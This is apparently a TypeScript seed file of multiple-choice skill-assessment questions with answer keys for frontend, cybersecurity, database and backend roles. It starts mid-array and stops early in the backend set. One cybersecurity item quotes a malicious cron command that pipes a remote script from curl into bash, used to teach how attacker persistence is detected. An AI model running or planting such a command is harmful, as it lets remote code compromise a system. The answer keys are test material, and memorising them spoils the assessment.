    { skill: 'javascript', name: 'JavaScript Core', diff: 'applied', q: 'What is the difference between `==` and `===` in JavaScript?', opts: ['== performs type coercion before comparison; === checks both value and strict type', '=== is slower and deprecated', '== only works on numbers', 'They are completely identical'], ans: '== performs type coercion before comparison; === checks both value and strict type', exp: 'Strict equality (===) prevents unexpected type conversion pitfalls (e.g. 0 == false).' },
    { skill: 'html-css', name: 'HTML & CSS Foundations', diff: 'applied', q: 'Which CSS Flexbox property aligns items along the main axis of a container?', opts: ['align-items', 'justify-content', 'align-content', 'flex-direction'], ans: 'justify-content', exp: 'justify-content distributes space along the primary axis (horizontal by default).' },
    { skill: 'dom', name: 'DOM & Browser APIs', diff: 'applied', q: 'What is Event Delegation in browser JavaScript?', opts: ['Adding event listeners to every child node individually', 'Attaching a single event listener to a parent element and utilizing event bubbling to catch child events', 'Disabling mouse clicks', 'Sending events via WebSocket'], ans: 'Attaching a single event listener to a parent element and utilizing event bubbling to catch child events', exp: 'Event delegation reduces memory overhead by listening at parent containers.' },
    { skill: 'a11y', name: 'Web Accessibility (a11y)', diff: 'applied', q: 'When creating an interactive modal dialog, what keyboard behavior is mandatory for accessibility?', opts: ['Pressing Escape closes the modal and focus traps inside the modal while open', 'Disabling the Tab key', 'Auto-submitting forms on focus', 'Hiding all text labels'], ans: 'Pressing Escape closes the modal and focus traps inside the modal while open', exp: 'Focus management and Esc key dismissal are core WCAG modal dialog requirements.' },
    { skill: 'state-management', name: 'State Management', diff: 'applied', q: 'When should you use the `useCallback` hook in React?', opts: ['On every single function in the entire app', 'To memoize a callback function reference across renders when passing it to optimized child components', 'To fetch data from backend', 'To replace useState'], ans: 'To memoize a callback function reference across renders when passing it to optimized child components', exp: 'useCallback preserves referential equality of callbacks to prevent unnecessary child re-renders.' },
    { skill: 'responsive-design', name: 'Responsive Layouts', diff: 'applied', q: 'What CSS media query targets viewport widths of 768px and wider (standard tablet breakpoint)?', opts: ['@media (max-width: 768px)', '@media (min-width: 768px)', '@media screen and (height: 768px)', '@media (device: tablet)'], ans: '@media (min-width: 768px)', exp: 'min-width: 768px applies styles to screens that meet or exceed 768px (mobile-first strategy).' },
    { skill: 'http-apis', name: 'HTTP & APIs', diff: 'applied', q: 'What browser security policy restricts web applications from loading resources from a different origin unless headers permit it?', opts: ['Content Security Policy (CSP)', 'Cross-Origin Resource Sharing (CORS)', 'Strict Transport Security (HSTS)', 'X-Frame-Options'], ans: 'Cross-Origin Resource Sharing (CORS)', exp: 'CORS governs cross-domain browser HTTP requests.' },
    { skill: 'debugging', name: 'Debugging & Code Reading', diff: 'applied', q: 'A form input value resets immediately upon typing. What is the most common cause in a React controlled component?', opts: ['The onChange handler does not update the state bound to the value prop', 'CSS display: none is active', 'The keyboard is broken', 'HTML5 does not support input'], ans: 'The onChange handler does not update the state bound to the value prop', exp: 'Controlled components reflect state; without updating state on change, the input snaps back.' },

    // Scenario 18-22
    { skill: 'react', name: 'React Foundations', diff: 'scenario', q: 'A large data table re-renders 500 rows on every keystroke in a search input. How do you optimize this?', opts: ['Debounce the search input or memoize individual row items using React.memo', 'Delete the data table', 'Convert React app to jQuery', 'Disable browser rendering'], ans: 'Debounce the search input or memoize individual row items using React.memo', exp: 'Debouncing throttles filter computations and React.memo skips re-rendering unchanged row cells.' },
    { skill: 'javascript', name: 'JavaScript Core', diff: 'scenario', q: 'You need to debounce a resize event listener that triggers heavy recalculations. What does a debounce function do?', opts: ['Executes the function once every millisecond', 'Delays invoking the function until after a specified wait time has elapsed since the last time it was invoked', 'Runs the function on the server', 'Cancels all future network calls'], ans: 'Delays invoking the function until after a specified wait time has elapsed since the last time it was invoked', exp: 'Debouncing suppresses intermediate invocations until bursts of events cease.' },
    { skill: 'a11y', name: 'Web Accessibility (a11y)', diff: 'scenario', q: 'An icon button contains only a SVG graphic without text. How do you make it accessible to screen readers?', opts: ['Add an aria-label attribute (e.g. aria-label="Close dialog") or visually-hidden text', 'Change the icon color to red', 'Wrap it in a <div>', 'Disable tabindex'], ans: 'Add an aria-label attribute (e.g. aria-label="Close dialog") or visually-hidden text', exp: 'aria-label announces an accessible name to screen readers when visible text is absent.' },
    { skill: 'html-css', name: 'HTML & CSS Foundations', diff: 'scenario', q: 'A background image causes low contrast with overlay text, making text hard to read. What CSS technique resolves this effectively?', opts: ['Add a semi-transparent dark overlay gradient (e.g. rgba(0,0,0,0.5)) or text-shadow', 'Decrease font-size to 8px', 'Remove all text from the website', 'Use yellow comic sans'], ans: 'Add a semi-transparent dark overlay gradient (e.g. rgba(0,0,0,0.5)) or text-shadow', exp: 'Overlay scrims ensure WCAG 4.5:1 text-to-background contrast ratios are satisfied.' },
    { skill: 'debugging', name: 'Debugging & Code Reading', diff: 'scenario', q: 'In React, why must you include a unique `key` prop when rendering a list of items?', opts: ['To style the list with CSS', 'To help React identify which items have changed, been added, or removed during DOM reconciliation', 'To store passwords', 'Keys are optional and provide no benefit'], ans: 'To help React identify which items have changed, been added, or removed during DOM reconciliation', exp: 'Stable keys allow React to track identity across renders without rebuilding whole DOM subtrees.' },

    // Challenging 23-25
    { skill: 'react', name: 'React Foundations', diff: 'challenging', q: 'What is a stale closure in React `useEffect` and how is it resolved?', opts: ['A closure that references outdated state or props from an earlier render; resolved by listing all referenced dependencies in the dependency array', 'A corrupted browser cache', 'A CSS styling bug', 'A hardware memory leak'], ans: 'A closure that references outdated state or props from an earlier render; resolved by listing all referenced dependencies in the dependency array', exp: 'Missing dependencies trap stale values inside closure scopes.' },
    { skill: 'javascript', name: 'JavaScript Core', diff: 'challenging', q: 'In the JavaScript Event Loop, what is the execution priority between Microtasks (Promise.then) and Macrotasks (setTimeout)?', opts: ['Macrotasks execute before microtasks', 'All microtasks in the microtask queue run to completion before the next macrotask is dequeued', 'They execute completely at random', 'Timers block promises indefinitely'], ans: 'All microtasks in the microtask queue run to completion before the next macrotask is dequeued', exp: 'Microtask queue has priority and empties before the event loop advances to the next task.' },
    { skill: 'state-management', name: 'State Management', diff: 'challenging', q: 'How does Optimistic UI update improve perceived user experience during network operations?', opts: ['Updates the UI immediately assuming server success, rolling back if the request fails', 'Waits 10 seconds before sending requests', 'Sends requests twice', 'Blocks the entire screen with a loader'], ans: 'Updates the UI immediately assuming server success, rolling back if the request fails', exp: 'Optimistic UI makes interfaces feel instantaneous by applying state updates ahead of network confirmation.' },
  ];

  return topics.map((t, i) => ({
    roleSlug: 'frontend-developer',
    skillSlug: t.skill,
    skillName: t.name,
    difficulty: t.diff as any,
    questionType: 'MCQ',
    question: t.q,
    options: t.opts,
    correctAnswer: t.ans,
    explanation: t.exp,
    timeLimitSeconds: t.diff === 'easy' ? 45 : t.diff === 'applied' ? 60 : 90,
    orderIndex: i + 1,
  }));
}

// 25 Questions for Cybersecurity Analyst
function getCyberQuestions(): SeedAssessmentQuestion[] {
  const topics = [
    { skill: 'security-fundamentals', name: 'Security Fundamentals', diff: 'easy', q: 'What does the CIA Triad stand for in information security?', opts: ['Confidentiality, Integrity, Availability', 'Central Intelligence Agency', 'Control, Identity, Authentication', 'Cryptography, Inspection, Access'], ans: 'Confidentiality, Integrity, Availability', exp: 'The CIA triad is the foundational model for security policy and posture.' },
    { skill: 'networking', name: 'Networking & Protocols', diff: 'easy', q: 'Which default port is utilized by secure HTTPS web traffic?', opts: ['80', '443', '22', '3389'], ans: '443', exp: 'Port 443 is the standard port for TLS/SSL encrypted HTTPS communication.' },
    { skill: 'linux', name: 'Linux Security', diff: 'easy', q: 'Which Linux command displays active network listening ports and established connections?', opts: ['netstat -tuln (or ss -tuln)', 'cat /etc/passwd', 'ls -la', 'chmod 777'], ans: 'netstat -tuln (or ss -tuln)', exp: 'ss/netstat inspects listening socket descriptors and TCP/UDP ports.' },
    { skill: 'siem-logs', name: 'SIEM & Log Analysis', diff: 'easy', q: 'In Linux authentication logs (/var/log/auth.log), what does repeated "Failed password for root" entries signify?', opts: ['Standard user login', 'Potential automated brute-force attack against SSH credentials', 'System memory exhaustion', 'Valid kernel update'], ans: 'Potential automated brute-force attack against SSH credentials', exp: 'Rapid repetitive authentication failures indicate credential stuffing or brute force.' },
    { skill: 'threat-detection', name: 'Threat Detection & IOCs', diff: 'easy', q: 'What is an Indicator of Compromise (IOC)?', opts: ['A piece of digital forensic evidence (like a malicious IP, file hash, or domain) suggesting a security breach has occurred', 'An employee ID badge', 'A firewall hardware error', 'A software license key'], ans: 'A piece of digital forensic evidence (like a malicious IP, file hash, or domain) suggesting a security breach has occurred', exp: 'IOCs serve as forensic signatures to detect and hunt active or past threat activity.' },
    { skill: 'incident-response', name: 'Incident Response', diff: 'easy', q: 'What is the immediate primary objective during the "Containment" phase of incident response?', opts: ['Format all company hard drives', 'Isolate the affected system from the network to prevent lateral movement and data exfiltration', 'Post on social media', 'Delete log files'], ans: 'Isolate the affected system from the network to prevent lateral movement and data exfiltration', exp: 'Containment limits breach blast radius and prevents attackers from moving laterally.' },
    { skill: 'authentication', name: 'Authentication & Access Control', diff: 'easy', q: 'What security mechanism requires two or more distinct factors (e.g. password + hardware token) to authenticate?', opts: ['Single Sign-On (SSO)', 'Multi-Factor Authentication (MFA)', 'Basic Auth', 'Cookie Sessions'], ans: 'Multi-Factor Authentication (MFA)', exp: 'MFA combines something you know, something you have, or something you are.' },
    { skill: 'security-analysis', name: 'Security Analysis & Triage', diff: 'easy', q: 'What is a Phishing attack?', opts: ['Social engineering via fraudulent emails or websites designed to trick victims into revealing sensitive credentials', 'Overheating a server rack', 'Scanning for open WiFi', 'Encrypting hard drives'], ans: 'Social engineering via fraudulent emails or websites designed to trick victims into revealing sensitive credentials', exp: 'Phishing exploits human deception to steal credentials or deliver malware payloads.' },

    // Applied 9-17
    { skill: 'networking', name: 'Networking & Protocols', diff: 'applied', q: 'What type of network attack intercepts unencrypted communications between a client and server?', opts: ['Man-in-the-Middle (MITM) attack', 'DDoS flood', 'Buffer overflow', 'SQL Injection'], ans: 'Man-in-the-Middle (MITM) attack', exp: 'MITM eavesdrops or alters traffic in transit when TLS/encryption is absent or compromised.' },
    { skill: 'linux', name: 'Linux Security', diff: 'applied', q: 'What permission does `chmod 600 id_rsa` assign to an SSH private key file?', opts: ['Read and write for owner only; zero access for group and others', 'Read, write, execute for everyone', 'Read only for root', 'Public access'], ans: 'Read and write for owner only; zero access for group and others', exp: '600 (rw-------) restricts access strictly to the owner, preventing unauthorized key leakage.' },
    { skill: 'siem-logs', name: 'SIEM & Log Analysis', diff: 'applied', q: 'You observe an IP address making 5,000 HTTP POST requests to `/login` within 60 seconds from a single subnet. What is this?', opts: ['Normal peak traffic', 'Credential stuffing / Brute force attack', 'Database backup', 'DNS lookup'], ans: 'Credential stuffing / Brute force attack', exp: 'High-frequency POST requests to auth endpoints are characteristic of automated credential stuffing.' },
    { skill: 'threat-detection', name: 'Threat Detection & IOCs', diff: 'applied', q: 'Why is comparing a suspicious file\'s SHA-256 hash against threat databases (like VirusTotal) valuable?', opts: ['Hashes uniquely fingerprint binary content regardless of filename obfuscation', 'Hashes decrypt the file', 'Hashes execute the virus safely', 'Hashes create backups'], ans: 'Hashes uniquely fingerprint binary content regardless of filename obfuscation', exp: 'Cryptographic hashes provide collision-resistant digital signatures of known malware.' },
    { skill: 'incident-response', name: 'Incident Response', diff: 'applied', q: 'Why is it critical to preserve memory state (RAM dump) before rebooting a compromised server?', opts: ['Volatile artifacts like active malware processes, network connections, and unencrypted keys in RAM are lost on reboot', 'Rebooting speeds up malware', 'RAM dumps are required for warranty', 'Servers cannot reboot'], ans: 'Volatile artifacts like active malware processes, network connections, and unencrypted keys in RAM are lost on reboot', exp: 'Volatile memory contains transient forensic evidence essential for root-cause analysis.' },
    { skill: 'authentication', name: 'Authentication & Access Control', diff: 'applied', q: 'What is the Principle of Least Privilege (PoLP)?', opts: ['Granting users only the minimum permissions necessary to perform their legitimate job duties', 'Giving every engineer root access', 'Sharing admin passwords across teams', 'Disabling user passwords'], ans: 'Granting users only the minimum permissions necessary to perform their legitimate job duties', exp: 'Least privilege minimizes threat surfaces and restricts potential compromised account damage.' },
    { skill: 'security-fundamentals', name: 'Security Fundamentals', diff: 'applied', q: 'What differentiates Symmetric Encryption from Asymmetric Encryption?', opts: ['Symmetric uses one shared key for encryption/decryption; Asymmetric uses a public/private key pair', 'Asymmetric is deprecated', 'Symmetric does not use keys', 'They are identical'], ans: 'Symmetric uses one shared key for encryption/decryption; Asymmetric uses a public/private key pair', exp: 'Symmetric (e.g. AES) uses a single shared secret; asymmetric (e.g. RSA) uses dual keys.' },
    { skill: 'security-analysis', name: 'Security Analysis & Triage', diff: 'applied', q: 'An email claims to be from IT asking for immediate password verification with a link to `http://it-support-login.com.evil.co`. What indicates it is malicious?', opts: ['The domain is a deceptive subdomain on evil.co and uses insecure HTTP', 'The email was sent on a Friday', 'It contains a greeting', 'It is 2 paragraphs long'], ans: 'The domain is a deceptive subdomain on evil.co and uses insecure HTTP', exp: 'Domain impersonation and insecure protocol indicate phishing credential harvesting.' },
    { skill: 'networking', name: 'Networking & Protocols', diff: 'applied', q: 'What is the role of a Stateful Firewall in network security?', opts: ['Tracking the state of active network connections and filtering packets based on protocol state context', 'Encrypting hard drives', 'Resetting passwords', 'Managing DNS names'], ans: 'Tracking the state of active network connections and filtering packets based on protocol state context', exp: 'Stateful firewalls inspect connection states (SYN/ACK/ESTABLISHED) rather than static packet headers alone.' },

    // Scenario 18-22
    { skill: 'siem-logs', name: 'SIEM & Log Analysis', diff: 'scenario', q: 'SIEM alerts on outbound connection to an unknown external IP on port 4444 delivering 2GB of compressed data at 3:00 AM. What is the highest risk hypothesis?', opts: ['Scheduled software update', 'Data exfiltration following unauthorized command-and-control (C2) beaconing', 'Valid user downloading movies', 'Normal DNS cache refresh'], ans: 'Data exfiltration following unauthorized command-and-control (C2) beaconing', exp: 'High-volume off-hours transfers on non-standard ports to unknown IPs are classic exfiltration patterns.' },
    { skill: 'incident-response', name: 'Incident Response', diff: 'scenario', q: 'A workstation is confirmed infected with active ransomware. What is your first immediate action?', opts: ['Pay the ransom immediately', 'Disconnect the workstation from Ethernet and WiFi to halt network share encryption and lateral spread', 'Email all employees', 'Format USB drives'], ans: 'Disconnect the workstation from Ethernet and WiFi to halt network share encryption and lateral spread', exp: 'Network isolation stops active worms and network-mapped drive encryption immediately.' },
    { skill: 'threat-detection', name: 'Threat Detection & IOCs', diff: 'scenario', q: 'You discover a malicious cron job running `curl http://malicious.sh | bash` every 10 minutes in `/etc/cron.d/`. What does this represent?', opts: ['Persistence mechanism established by an attacker', 'Standard Linux kernel job', 'Antivirus update', 'Harmless benchmark'], ans: 'Persistence mechanism established by an attacker', exp: 'Cron jobs are commonly used by attackers to maintain persistent access after initial exploitation.' },
    { skill: 'authentication', name: 'Authentication & Access Control', diff: 'scenario', q: 'Why should passwords never be stored in plain text or simple MD5 hashes in databases?', opts: ['Plaintext and MD5 are vulnerable to immediate exposure and rainbow table lookup; salted Argon2/bcrypt hashes must be used', 'MD5 uses too much memory', 'Plaintext passwords slow down SQL', 'Databases cannot store text'], ans: 'Plaintext and MD5 are vulnerable to immediate exposure and rainbow table lookup; salted Argon2/bcrypt hashes must be used', exp: 'Slow, salted hashing functions like bcrypt/Argon2 defend against precomputed rainbow table cracking.' },
    { skill: 'security-analysis', name: 'Security Analysis & Triage', diff: 'scenario', q: 'A vulnerability scan reports CVE-2026-1234 with a CVSS score of 9.8 (Critical) on a public-facing web server. What does CVSS 9.8 signify?', opts: ['Negligible impact', 'Critical severity vulnerability with high likelihood of remote exploitation and severe confidentiality/integrity impact; requires immediate emergency patch triage', 'Informational notice only', 'Hardware failure'], ans: 'Critical severity vulnerability with high likelihood of remote exploitation and severe confidentiality/integrity impact; requires immediate emergency patch triage', exp: 'CVSS scores above 9.0 indicate critical, easily exploitable vulnerabilities requiring urgent mitigation.' },

    // Challenging 23-25
    { skill: 'threat-detection', name: 'Threat Detection & IOCs', diff: 'challenging', q: 'What is a "Living off the Land" (LotL) attack technique?', opts: ['Using legitimate pre-installed operating system binaries (like PowerShell, certutil, WMI) to execute malicious actions without dropping foreign malware binaries', 'Stealing physical laptops', 'Mining cryptocurrency', 'Overclocking CPU'], ans: 'Using legitimate pre-installed operating system binaries (like PowerShell, certutil, WMI) to execute malicious actions without dropping foreign malware binaries', exp: 'LotL binaries (LOLBins) bypass signature-based antivirus by repurposing built-in admin tools.' },
    { skill: 'networking', name: 'Networking & Protocols', diff: 'challenging', q: 'In DNS tunneling detection, what query anomaly strongly suggests data exfiltration over DNS?', opts: ['High volume of unique, long subdomain labels containing high Shannon entropy (e.g. `a8f1b2c4.exfil.domain.com`)', 'Normal queries for google.com', 'Standard NTP sync', 'Low CPU usage'], ans: 'High volume of unique, long subdomain labels containing high Shannon entropy (e.g. `a8f1b2c4.exfil.domain.com`)', exp: 'DNS tunneling encodes data chunks inside subdomain labels to bypass boundary inspection.' },
    { skill: 'security-fundamentals', name: 'Security Fundamentals', diff: 'challenging', q: 'What is the primary objective of a Zero Trust Architecture (ZTA)?', opts: ['Never trust, always verify: assume breach and strictly enforce continuous authentication and least-privilege access regardless of network perimeter location', 'Trust all traffic inside the corporate office LAN', 'Disable firewalls', 'Eliminate all passwords'], ans: 'Never trust, always verify: assume breach and strictly enforce continuous authentication and least-privilege access regardless of network perimeter location', exp: 'Zero Trust eliminates implicit trust based on network topology.' },
  ];

  return topics.map((t, i) => ({
    roleSlug: 'cybersecurity-analyst',
    skillSlug: t.skill,
    skillName: t.name,
    difficulty: t.diff as any,
    questionType: 'MCQ',
    question: t.q,
    options: t.opts,
    correctAnswer: t.ans,
    explanation: t.exp,
    timeLimitSeconds: t.diff === 'easy' ? 45 : t.diff === 'applied' ? 60 : 90,
    orderIndex: i + 1,
  }));
}

// 25 Questions for Database Administrator
function getDbaQuestions(): SeedAssessmentQuestion[] {
  const topics = [
    { skill: 'sql', name: 'SQL & Relational Foundations', diff: 'easy', q: 'Which SQL statement removes all rows from a table quickly without logging individual row deletions?', opts: ['DELETE FROM table;', 'TRUNCATE TABLE table;', 'DROP TABLE table;', 'REMOVE table;'], ans: 'TRUNCATE TABLE table;', exp: 'TRUNCATE is a DDL operation that deallocates data pages rapidly with minimal logging.' },
    { skill: 'database-design', name: 'Database Schema Design', diff: 'easy', q: 'What is a Primary Key constraint in relational databases?', opts: ['A column or set of columns that uniquely identifies each row in a table and cannot contain NULL values', 'A password column', 'An optional comment', 'A temporary index'], ans: 'A column or set of columns that uniquely identifies each row in a table and cannot contain NULL values', exp: 'Primary keys guarantee row uniqueness and entity integrity.' },
    { skill: 'indexes', name: 'Indexes & Query Optimization', diff: 'easy', q: 'What is the default index structure used in most relational databases (PostgreSQL, MySQL, Oracle)?', opts: ['B-Tree (Balanced Tree)', 'Hash only', 'Linked List', 'Array'], ans: 'B-Tree (Balanced Tree)', exp: 'B-Tree indexes efficiently handle equality, range queries, and sorted ordering.' },
    { skill: 'transactions', name: 'Transactions & ACID', diff: 'easy', q: 'Which transaction command commits all changes made during the current transaction permanently to disk?', opts: ['ROLLBACK', 'COMMIT', 'SAVEPOINT', 'DISCARD'], ans: 'COMMIT', exp: 'COMMIT finalizes transaction modifications and enforces persistence.' },
    { skill: 'backup-recovery', name: 'Backup & Recovery', diff: 'easy', q: 'What is the difference between a Full Backup and an Incremental Backup?', opts: ['Full backs up the entire database; Incremental backs up only data changed since the last backup', 'Incremental is larger than Full', 'Full deletes previous records', 'They are identical'], ans: 'Full backs up the entire database; Incremental backs up only data changed since the last backup', exp: 'Incremental backups reduce storage and backup windows by capturing only recent deltas.' },
    { skill: 'security', name: 'Database Security', diff: 'easy', q: 'Which SQL command removes a specific privilege from a database user?', opts: ['REVOKE', 'GRANT', 'DENY ALL', 'DELETE PERMISSION'], ans: 'REVOKE', exp: 'REVOKE rescinds granted privileges from roles or users.' },
    { skill: 'normalization', name: 'Normalization', diff: 'easy', q: 'What is the primary goal of Database Normalization (1NF, 2NF, 3NF)?', opts: ['To eliminate data redundancy and prevent update/delete anomalies', 'To increase disk usage', 'To make queries slower', 'To merge all tables into one single table'], ans: 'To eliminate data redundancy and prevent update/delete anomalies', exp: 'Normalization organizes schema structure to minimize duplicated data and anomalies.' },
    { skill: 'performance', name: 'Performance & Monitoring', diff: 'easy', q: 'In PostgreSQL, which command prefix shows the execution plan chosen by the query planner?', opts: ['EXPLAIN (or EXPLAIN ANALYZE)', 'SHOW QUERY', 'DEBUG PLAN', 'PROFILE SQL'], ans: 'EXPLAIN (or EXPLAIN ANALYZE)', exp: 'EXPLAIN displays the execution plan cost and index usage selected by the optimizer.' },

    // Applied 9-17
    { skill: 'indexes', name: 'Indexes & Query Optimization', diff: 'applied', q: 'Why might a database optimizer choose a Sequential Scan (Full Table Scan) over an Index Scan on a small table of 200 rows?', opts: ['Reading a few contiguous disk blocks directly is faster than index lookup overhead for tiny tables', 'Indexes cannot be created on small tables', 'Sequential scans are always faster on billion row tables', 'The index is corrupted'], ans: 'Reading a few contiguous disk blocks directly is faster than index lookup overhead for tiny tables', exp: 'For small datasets, sequential reading incurs lower I/O cost than random index traversal.' },
    { skill: 'database-design', name: 'Database Schema Design', diff: 'applied', q: 'In a Many-to-Many relationship between `students` and `courses`, how should the relationship be modeled?', opts: ['A junction/bridge table (`student_courses`) containing foreign keys to both tables', 'Adding 100 course columns to students', 'Storing course IDs as comma-separated text', 'Creating a separate database for each student'], ans: 'A junction/bridge table (`student_courses`) containing foreign keys to both tables', exp: 'Junction tables normalize many-to-many associations into two 1-to-many foreign key relationships.' },
    { skill: 'transactions', name: 'Transactions & ACID', diff: 'applied', q: 'What is a "Dirty Read" anomaly in database transaction isolation levels?', opts: ['A transaction reads uncommitted changes written by another concurrent transaction that is later rolled back', 'A query reading from a deleted table', 'Reading corrupted disk blocks', 'A syntax error in SQL'], ans: 'A transaction reads uncommitted changes written by another concurrent transaction that is later rolled back', exp: 'Dirty reads occur under READ UNCOMMITTED isolation when uncommitted mutations are observed.' },
    { skill: 'backup-recovery', name: 'Backup & Recovery', diff: 'applied', q: 'What does Point-In-Time Recovery (PITR) enable a DBA to do?', opts: ['Restore the database state to an exact specific second prior to an accidental corruption event using base backup and WAL logs', 'Speed up website loading', 'Auto-delete old users', 'Translate SQL to Python'], ans: 'Restore the database state to an exact specific second prior to an accidental corruption event using base backup and WAL logs', exp: 'PITR replays Write-Ahead Logs (WAL) over a base backup up to the exact designated timestamp.' },
    { skill: 'performance', name: 'Performance & Monitoring', diff: 'applied', q: 'What is the risk of having too many unused indexes on a high-throughput write-heavy table?', opts: ['Every INSERT, UPDATE, and DELETE must update every index structure, degrading write performance', 'Table disk size decreases', 'Queries fail to compile', 'Database auto-shuts down'], ans: 'Every INSERT, UPDATE, and DELETE must update every index structure, degrading write performance', exp: 'Index maintenance adds I/O write amplification during row insertions and mutations.' },
    { skill: 'normalization', name: 'Normalization', diff: 'applied', q: 'A table is in Second Normal Form (2NF) and has no transitive dependencies between non-key columns. What normal form is it in?', opts: ['First Normal Form (1NF)', 'Third Normal Form (3NF)', 'Un-normalized', 'Fifth Normal Form (5NF)'], ans: 'Third Normal Form (3NF)', exp: '3NF requires 2NF plus the absence of transitive dependencies on the primary key.' },
    { skill: 'security', name: 'Database Security', diff: 'applied', q: 'Why is connecting database applications using the `postgres`/`root` superuser an anti-pattern in production?', opts: ['Violates least privilege; compromised app credentials grant total control over entire database cluster and OS file access', 'Root users cannot execute queries', 'Superusers are read-only', 'Superusers expire every 24 hours'], ans: 'Violates least privilege; compromised app credentials grant total control over entire database cluster and OS file access', exp: 'Dedicated least-privilege application roles prevent catastrophic unauthorized operations.' },
    { skill: 'sql', name: 'SQL & Relational Foundations', diff: 'applied', q: 'What does `COALESCE(expression1, expression2, expression3)` return?', opts: ['The first non-NULL value in the list', 'The average of all values', 'The count of NULLs', 'A concatenated string'], ans: 'The first non-NULL value in the list', exp: 'COALESCE evaluates arguments sequentially and returns the first non-null expression.' },
    { skill: 'performance', name: 'Performance & Monitoring', diff: 'applied', q: 'What causes a Deadlock between two concurrent database transactions?', opts: ['Transaction A holds lock X and waits for lock Y, while Transaction B holds lock Y and waits for lock X', 'Server running out of disk space', 'Database having 0 records', 'Primary key duplication'], ans: 'Transaction A holds lock X and waits for lock Y, while Transaction B holds lock Y and waits for lock X', exp: 'Deadlocks occur when two transactions are blocked waiting for locks held by each other.' },

    // Scenario 18-22
    { skill: 'performance', name: 'Performance & Monitoring', diff: 'scenario', q: 'A query SELECT * FROM users WHERE LOWER(email) = "test@example.com" is slow despite a standard index on email. How do you fix it?', opts: ['Create a Functional (Expression) Index on LOWER(email)', 'Drop the email column', 'Run VACUUM every 10 seconds', 'Convert table to NoSQL'], ans: 'Create a Functional (Expression) Index on LOWER(email)', exp: 'Functions applied to indexed columns disable standard B-tree lookups unless an expression index exists.' },
    { skill: 'indexes', name: 'Indexes & Query Optimization', diff: 'scenario', q: 'You frequently query SELECT * FROM orders WHERE customer_id = 42 AND status = "SHIPPED" ORDER BY order_date DESC. What composite index is optimal?', opts: ['CREATE INDEX idx_orders_comp ON orders (customer_id, status, order_date DESC);', 'Index on status only', 'Index on order_date only', 'No index'], ans: 'CREATE INDEX idx_orders_comp ON orders (customer_id, status, order_date DESC);', exp: 'Composite indexes matching equality filters followed by sort direction enable pure index scans.' },
    { skill: 'backup-recovery', name: 'Backup & Recovery', diff: 'scenario', q: 'A junior developer accidentally executes DROP TABLE customers; at 14:32:00. What recovery strategy recovers all data up to 14:31:59?', opts: ['Restore yesterday base backup, configure recovery_target_time = "14:31:59", and replay WAL archives (PITR)', 'Restart the server', 'Execute CREATE TABLE customers', 'Data is permanently lost and impossible to recover'], ans: 'Restore yesterday base backup, configure recovery_target_time = "14:31:59", and replay WAL archives (PITR)', exp: 'PITR replays WAL up to the precise second before the destructive DDL execution.' },
    { skill: 'transactions', name: 'Transactions & ACID', diff: 'scenario', q: 'Under READ COMMITTED isolation, a query counts 100 rows in Table A, but running the same query 5 seconds later in the same transaction yields 105 rows. What is this phenomenon?', opts: ['Phantom Read anomaly', 'Hardware failure', 'Deadlock', 'SQL syntax error'], ans: 'Phantom Read anomaly', exp: 'Phantom reads occur when concurrent committed transactions insert new matching rows between reads.' },
    { skill: 'database-design', name: 'Database Schema Design', diff: 'scenario', q: 'Why is storing monetary values using `FLOAT` or `DOUBLE PRECISION` data types considered a critical bug?', opts: ['Floating-point binary representation introduces rounding errors (e.g. 0.1 + 0.2 = 0.30000000000000004); always use NUMERIC/DECIMAL', 'Floats cannot store positive numbers', 'Databases do not support floats', 'Floats take 100x more disk space'], ans: 'Floating-point binary representation introduces rounding errors (e.g. 0.1 + 0.2 = 0.30000000000000004); always use NUMERIC/DECIMAL', exp: 'Financial ledgers require exact fixed-point precision with NUMERIC/DECIMAL to avoid cents discrepancy.' },

    // Challenging 23-25
    { skill: 'indexes', name: 'Indexes & Query Optimization', diff: 'challenging', q: 'What is a Covering Index (Index-Only Scan) in PostgreSQL/MySQL?', opts: ['An index containing all columns requested by a SELECT query, allowing the database to satisfy the query entirely from the index without accessing the table heap pages', 'An index covering all tables in the database', 'A temporary index deleted after each query', 'An index that encrypts table columns'], ans: 'An index containing all columns requested by a SELECT query, allowing the database to satisfy the query entirely from the index without accessing the table heap pages', exp: 'Index-Only Scans eliminate random table heap disk I/O by fulfilling queries directly from the leaf nodes.' },
    { skill: 'performance', name: 'Performance & Monitoring', diff: 'challenging', q: 'What is the primary role of PostgreSQL autovacuum process?', opts: ['Reclaiming space from dead tuples (MVCC versioning), freezing transaction IDs to prevent wraparound, and updating table statistics for the optimizer', 'Deleting old user accounts', 'Recompiling stored procedures', 'Formatting disk drives'], ans: 'Reclaiming space from dead tuples (MVCC versioning), freezing transaction IDs to prevent wraparound, and updating table statistics for the optimizer', exp: 'Vacuum cleans dead tuple storage created by updates/deletes and prevents 32-bit transaction ID wraparound.' },
    { skill: 'database-design', name: 'Database Schema Design', diff: 'challenging', q: 'When is Denormalization deliberately introduced into a high-scale production database schema?', opts: ['Strategically introducing controlled redundancy in read-heavy analytics/reporting schemas to avoid expensive multi-table JOIN operations', 'When developers forget foreign keys', 'To make schemas harder to understand', 'Denormalization is always an error'], ans: 'Strategically introducing controlled redundancy in read-heavy analytics/reporting schemas to avoid expensive multi-table JOIN operations', exp: 'Intentional denormalization trades write overhead and storage for sub-millisecond read latency.' },
  ];

  return topics.map((t, i) => ({
    roleSlug: 'database-administrator',
    skillSlug: t.skill,
    skillName: t.name,
    difficulty: t.diff as any,
    questionType: 'MCQ',
    question: t.q,
    options: t.opts,
    correctAnswer: t.ans,
    explanation: t.exp,
    timeLimitSeconds: t.diff === 'easy' ? 45 : t.diff === 'applied' ? 60 : 90,
    orderIndex: i + 1,
  }));
}

// 25 Questions for Backend Developer
function getBackendQuestions(): SeedAssessmentQuestion[] {
  const topics = [
    { skill: 'rest-apis', name: 'RESTful API Design', diff: 'easy', q: 'Which HTTP method should be used to create a new resource on a server?', opts: ['GET', 'POST', 'PUT', 'DELETE'], ans: 'POST', exp: 'POST is the standard method used to submit data and instantiate a new resource.' },
    { skill: 'auth', name: 'Authentication & Security', diff: 'easy', q: 'What does a JSON Web Token (JWT) typically contain in its three base64-encoded segments?', opts: ['Header, Payload, Signature', 'Username, Password, Email', 'Database, Table, Row', 'IP Address, Port, MAC'], ans: 'Header, Payload, Signature', exp: 'JWT structure consists of a header (algorithm), payload (claims), and cryptographic signature.' },
